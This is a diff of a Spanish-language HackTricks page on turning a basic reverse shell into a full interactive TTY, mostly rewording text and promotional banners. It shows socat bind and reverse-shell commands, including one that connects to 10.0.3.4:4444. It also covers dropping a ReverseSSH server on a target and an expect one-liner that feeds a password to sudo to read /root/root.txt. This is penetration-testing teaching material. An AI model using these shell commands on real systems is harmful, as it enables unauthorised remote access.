@@ -1,6 +1,22 @@
-# TTY completo
+# TTY Completo
 
-Tenga en cuenta que la shell que establezca en la variable `SHELL` **debe** estar **listada dentro** de _**/etc/shells**_ o `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Además, tenga en cuenta que los siguientes fragmentos solo funcionan en bash. Si está en zsh, cambie a bash antes de obtener la shell ejecutando `bash`.
+<details>
+
+<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+
+Otras formas de apoyar a HackTricks:
+
+* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
+
+</details>
+
+## TTY Completo
+
+Ten en cuenta que la shell que establezcas en la variable `SHELL` **debe** estar **listada dentro** de _**/etc/shells**_ o `El valor de la variable SHELL no se encontró en el archivo /etc/shells. Este incidente ha sido reportado`. Además, ten en cuenta que los siguientes fragmentos solo funcionan en bash. Si estás en zsh, cambia a bash antes de obtener la shell ejecutando `bash`.
 
 #### Python
 
@@ -26,22 +42,6 @@ script /dev/null -qc /bin/bash #/dev/null is to not store anything
 {% endcode %}
 
 #### socat
-
-Socat es una herramienta de red multipropósito que permite la creación de conexiones bidireccionales entre dos puntos. Es muy útil para redirigir puertos, tunelizar conexiones y mucho más. En el contexto de una shell completa, se puede utilizar para redirigir la entrada y salida estándar de un proceso a través de una conexión de red. Esto permite a un atacante interactuar con una shell remota como si estuviera en la máquina local. 
-
-Para utilizar socat, primero se debe establecer una conexión de red entre la máquina local y la remota. Por ejemplo, para redirigir la entrada y salida estándar de una shell remota a través de una conexión TCP, se puede ejecutar el siguiente comando en la máquina local:
-
-```bash
-socat TCP-LISTEN:4444,reuseaddr,fork EXEC:"bash -i"
-```
-
-Esto establece un servidor TCP en el puerto 4444 de la máquina local y redirige la entrada y salida estándar de un proceso de shell a través de la conexión. Luego, en la máquina remota, se puede ejecutar el siguiente comando para conectarse al servidor y obtener una shell completa:
-
-```bash
-socat TCP:<local-ip>:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
-```
-
-Donde `<local-ip>` es la dirección IP de la máquina local. Esto establece una conexión TCP con el servidor en la máquina local y redirige la entrada y salida estándar de un proceso de shell a través de la conexión. La opción `pty` se utiliza para asignar un pseudo-terminal a la shell remota, lo que permite la interacción con la shell como si estuviera en la máquina local.
 ```bash
 #Listener:
 socat file:`tty`,raw,echo=0 tcp-listen:4444
@@ -66,7 +66,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-Una forma conveniente de obtener acceso a una **shell interactiva**, así como para **transferir archivos** y **reenviar puertos**, es dejar caer el servidor ssh estáticamente vinculado [ReverseSSH](https://github.com/Fahrj/reverse-ssh) en el objetivo.
+Una forma conveniente de obtener **acceso interactivo a la shell**, así como **transferencia de archivos** y **reenvío de puertos**, es dejar caer el servidor ssh enlazado estáticamente [ReverseSSH](https://github.com/Fahrj/reverse-ssh) en el objetivo.
 
 A continuación se muestra un ejemplo para `x86` con binarios comprimidos con upx. Para otros binarios, consulte la [página de lanzamientos](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
@@ -111,18 +111,20 @@ sftp -P 8888 127.0.0.1
 ```
 ## Sin TTY
 
-Si por alguna razón no puedes obtener un TTY completo, **todavía puedes interactuar con programas** que esperan entrada de usuario. En el siguiente ejemplo, se pasa la contraseña a `sudo` para leer un archivo:
+Si por alguna razón no puedes obtener un TTY completo, **aún puedes interactuar con programas** que esperan la entrada del usuario. En el siguiente ejemplo, la contraseña se pasa a `sudo` para leer un archivo:
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+Otras formas de apoyar a HackTricks:
+
+* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
